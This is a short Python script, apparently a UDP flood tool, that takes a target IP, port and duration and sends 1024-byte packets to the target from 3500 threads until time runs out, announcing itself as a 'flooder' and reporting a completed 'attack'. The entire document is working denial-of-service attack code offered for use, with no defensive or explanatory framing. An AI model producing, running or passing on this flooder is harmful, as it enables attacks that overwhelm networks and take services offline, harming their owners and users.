import sys, socket, threading, time, ipaddress

if len(sys.argv) != 4:
    print("Usage: python3 udp.py <ip> <port> <time>")
    sys.exit(1)

ip = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3])

print("Loading socket...")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print(f"Start flooder to {ip}:{port} for {duration} s")

stop_time = time.time() + duration
packet = b"A" * 1024
threads = 3500

def worker():
    while time.time() < stop_time:
        try:
            sock.sendto(packet, (ip, port))
        except Exception:
            pass

tlist = []
for _ in range(threads):
    t = threading.Thread(target=worker, daemon=True)
    t.start()
    tlist.append(t)

for t in tlist:
    t.join()

print("successfully attack complete")
sock.close()

